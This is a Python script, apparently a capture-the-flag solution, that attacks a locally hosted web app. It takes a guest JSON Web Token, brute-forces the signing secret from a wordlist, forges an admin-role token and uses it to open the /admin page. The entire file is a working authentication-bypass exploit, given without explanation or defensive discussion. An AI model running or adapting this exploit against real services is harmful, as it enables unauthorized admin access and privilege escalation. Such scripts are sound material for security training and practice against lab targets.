#!/usr/bin/python3
# Forge admin JWT by brute-forcing SECRET from wordlist.txt, then re-sign.
import hmac, hashlib, base64, json, urllib.request
def b64e(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")
# get guest token
opener = urllib.request.build_opener()
r = opener.open("http://127.0.0.1:80/")
guest = None
for h, v in r.getheaders():
    if h.lower() == "set-cookie" and "token=" in v:
        guest = v.split("token=")[1].split(";")[0].strip()
print("guest:", guest)
h, p, s = guest.split(".")
words = open("/challenge/wordlist.txt").read().split()
secret = None
for w in words:
    cand = b64e(hmac.new(w.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    if hmac.compare_digest(cand, s):
        secret = w.encode()
        break
print("secret:", secret.decode() if secret else None)
hdr = b64e(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
pay = b64e(json.dumps({"user": "guest", "role": "admin"}).encode())
sig = b64e(hmac.new(secret, (hdr + "." + pay).encode(), hashlib.sha256).digest())
forged = hdr + "." + pay + "." + sig
print("forged:", forged)
req = urllib.request.Request("http://127.0.0.1:80/admin", headers={"Cookie": "token=" + forged})
print(urllib.request.urlopen(req).read().decode())
